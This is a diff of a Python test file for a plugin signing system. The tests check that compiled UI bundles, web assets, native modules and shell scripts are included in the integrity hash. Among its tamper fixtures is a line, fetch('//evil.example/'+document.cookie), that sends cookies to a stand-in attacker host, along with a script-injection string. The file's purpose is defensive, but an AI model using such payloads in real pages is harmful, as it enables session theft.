@@ -143,12 +143,18 @@ def test_compute_hash_excludes_pycache(plugin_dir: Path) -> None:
     assert compute_plugin_hash(plugin_dir) == baseline
 
 
-def test_compute_hash_excludes_node_modules_and_ui(plugin_dir: Path) -> None:
+def test_compute_hash_excludes_node_modules_and_ui_build_inputs(
+    plugin_dir: Path,
+) -> None:
+    """node_modules and the non-shipped part of ``ui/`` stay out of the digest."""
     baseline = compute_plugin_hash(plugin_dir)
     (plugin_dir / "node_modules").mkdir()
     (plugin_dir / "node_modules" / "thing.py").write_text("x", encoding="utf-8")
-    (plugin_dir / "ui").mkdir()
-    (plugin_dir / "ui" / "ignored.py").write_text("y", encoding="utf-8")
+    (plugin_dir / "ui" / "src").mkdir(parents=True)
+    (plugin_dir / "ui" / "src" / "App.tsx").write_text("y", encoding="utf-8")
+    (plugin_dir / "ui" / "index.html").write_text("<html></html>", encoding="utf-8")
+    (plugin_dir / "ui" / "node_modules").mkdir()
+    (plugin_dir / "ui" / "node_modules" / "dep.js").write_text("z", encoding="utf-8")
     assert compute_plugin_hash(plugin_dir) == baseline
 
 
@@ -321,3 +327,145 @@ def test_verify_rejects_tampered_skill_md(plugin_dir: Path) -> None:
     )
     assert verify_plugin_integrity(plugin_dir, signed, strict=False) is False
     assert verify_plugin_integrity(plugin_dir, signed, strict=True) is False
+
+
+# ── Shipped-asset hash surface (0.27+) ───────────────────────────────────────
+
+
+def _write_dist_bundle(plugin_dir: Path, body: str = "console.log(1)\n") -> Path:
+    """Create a compiled dashboard bundle under ``ui/dist/``."""
+    dist = plugin_dir / "ui" / "dist" / "assets"
+    dist.mkdir(parents=True, exist_ok=True)
+    bundle = dist / "index-abc123.js"
+    bundle.write_text(body, encoding="utf-8")
+    return bundle
+
+
+def test_compute_hash_covers_ui_dist_bundle(plugin_dir: Path) -> None:
+    """``ui/dist/**`` ships and executes in the console — it must be hashed."""
+    base = compute_plugin_hash(plugin_dir)
+    bundle = _write_dist_bundle(plugin_dir)
+    with_bundle = compute_plugin_hash(plugin_dir)
+    assert with_bundle != base
+
+    bundle.write_text("fetch('//evil.example/'+document.cookie)\n", encoding="utf-8")
+    assert compute_plugin_hash(plugin_dir) != with_bundle
+
+
+def test_legacy_surfaces_ignored_ui_dist(plugin_dir: Path) -> None:
+    """Regression guard: the pre-0.27 surfaces excluded the whole ``ui/`` tree."""
+    from core.plugins.integrity import HashSurface, compute_legacy_plugin_hash
+
+    before_v1 = compute_plugin_hash(plugin_dir, surface=HashSurface.V1_SOURCE)
+    before_v2 = compute_plugin_hash(plugin_dir, surface=HashSurface.V2_BUILD)
+    _write_dist_bundle(plugin_dir)
+    assert compute_plugin_hash(plugin_dir, surface=HashSurface.V1_SOURCE) == before_v1
+    assert compute_plugin_hash(plugin_dir, surface=HashSurface.V2_BUILD) == before_v2
+    assert compute_legacy_plugin_hash(plugin_dir) == before_v1
+
+
+def test_verify_rejects_tampered_ui_dist_bundle(plugin_dir: Path) -> None:
+    """Injected JS in the shipped bundle now invalidates the signature."""
+    bundle = _write_dist_bundle(plugin_dir)
+    signed = compute_plugin_hash(plugin_dir)
+    assert verify_plugin_integrity(plugin_dir, signed, strict=False) is True
+
+    bundle.write_text("/* backdoor */\n", encoding="utf-8")
+    assert verify_plugin_integrity(plugin_dir, signed, strict=False) is False
+    assert verify_plugin_integrity(plugin_dir, signed, strict=True) is False
+
+
+def test_verify_rejects_added_ui_dist_file(plugin_dir: Path) -> None:
+    """Dropping a new served file into the bundle also breaks the signature."""
+    _write_dist_bundle(plugin_dir)
+    signed = compute_plugin_hash(plugin_dir)
+    (plugin_dir / "ui" / "dist" / "evil.html").write_text(
+        "<script>alert(1)</script>", encoding="utf-8"
+    )
+    assert verify_plugin_integrity(plugin_dir, signed, strict=False) is False
+
+
+@pytest.mark.parametrize(
+    "relpath",
+    [
+        "static/widget.js",
+        "static/widget.mjs",
+        "static/widget.cjs",
+        "static/index.html",
+        "static/theme.css",
+        "static/logo.svg",
+        "static/engine.wasm",
+        "ui/dist/index.html",
+    ],
+)
+def test_compute_hash_covers_served_web_assets(plugin_dir: Path, relpath: str) -> None:
+    base = compute_plugin_hash(plugin_dir)
+    target = plugin_dir / relpath
+    target.parent.mkdir(parents=True, exist_ok=True)
+    target.write_text("payload", encoding="utf-8")
+    assert compute_plugin_hash(plugin_dir) != base
+
+
+@pytest.mark.parametrize(
+    "relpath",
+    ["_native.so", "_native.pyd", "_native.dylib", "install.sh"],
+)
+def test_compute_hash_covers_native_and_shell(plugin_dir: Path, relpath: str) -> None:
+    """Native modules and shell scripts run outside Python's control."""
+    base = compute_plugin_hash(plugin_dir)
+    (plugin_dir / relpath).write_bytes(b"\x7fELF-ish")
+    assert compute_plugin_hash(plugin_dir) != base
+
+
+def test_v2_signature_accepted_outside_strict_but_not_in_strict(
+    plugin_dir: Path,
+) -> None:
+    """Existing 0.17-0.26 signatures keep loading until re-signed."""
+    from core.plugins.integrity import HashSurface
+
+    (plugin_dir / "pyproject.toml").write_text(
+        '[build-system]\nrequires = ["setuptools"]\n', encoding="utf-8"
+    )
+    _write_dist_bundle(plugin_dir)
+    v2 = compute_plugin_hash(plugin_dir, surface=HashSurface.V2_BUILD)
+    assert v2 != compute_plugin_hash(plugin_dir)
+    assert verify_plugin_integrity(plugin_dir, v2, strict=False) is True
+    assert verify_plugin_integrity(plugin_dir, v2, strict=True) is False
+
+
+def test_current_surface_is_v3(plugin_dir: Path) -> None:
+    from core.plugins.integrity import CURRENT_HASH_SURFACE, HashSurface
+
+    assert CURRENT_HASH_SURFACE is HashSurface.V3_SHIPPED
+    assert compute_plugin_hash(plugin_dir) == compute_plugin_hash(
+        plugin_dir, surface=HashSurface.V3_SHIPPED
+    )
+
+
+@pytest.mark.parametrize(
+    ("name", "v1", "v2", "v3"),
+    [
+        ("plugin.py", True, True, True),
+        ("stub.pyi", True, True, True),
+        ("pyproject.toml", False, True, True),
+        ("SKILL.md", False, True, True),
+        ("requirements.txt", False, True, True),
+        ("bundle.js", False, False, True),
+        ("bundle.MJS", False, False, True),
+        ("page.html", False, False, True),
+        ("ext.so", False, False, True),
+        ("setup.sh", False, False, True),
+        ("README.md", False, False, False),
+        ("data.json", False, False, False),
+        ("logo.png", False, False, False),
+    ],
+)
+def test_is_hashed_path_per_surface(name: str, v1: bool, v2: bool, v3: bool) -> None:
+    from core.plugins.integrity import HashSurface, is_hashed_path
+
+    path = Path("plugins/demo") / name
+    assert is_hashed_path(path, surface=HashSurface.V1_SOURCE) is v1
+    assert is_hashed_path(path, legacy=True) is v1
+    assert is_hashed_path(path, surface=HashSurface.V2_BUILD) is v2
+    assert is_hashed_path(path, surface=HashSurface.V3_SHIPPED) is v3
+    assert is_hashed_path(path) is v3
